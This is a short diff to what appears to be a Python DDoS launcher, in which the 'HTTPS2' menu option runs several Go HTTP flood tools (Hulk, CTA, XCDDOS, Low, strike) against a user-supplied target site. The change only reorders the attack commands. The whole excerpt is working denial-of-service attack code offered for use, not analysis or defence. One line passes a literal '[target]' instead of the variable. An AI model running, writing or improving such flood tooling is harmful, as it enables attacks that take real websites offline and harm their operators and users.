@@ -1503,10 +1503,10 @@ def command():
     elif command == "HTTPS2" or command == "https2" :
         try:
             target, thread, t = get_info_l7()
+            os.system(f'cd godzilla && go run XCDDOS.go -site {target} -data GET')
+            os.system(f'cd godzilla && go run CTA.go -site {target} -data GET')
             os.system(f'cd godzilla && go run Hulk.go -site {target} -data GET')
             os.system(f'cd godzilla && go run strike.go -url [target] -method GET')
-            os.system(f'cd godzilla && go run CTA.go -site {target} -data GET')
-            os.system(f'cd godzilla && go run XCDDOS.go -site {target} -data GET')
             os.system(f'cd godzilla && go run Low.go -site {target} -data GET')
             os.system("clear")
         except IndexError:
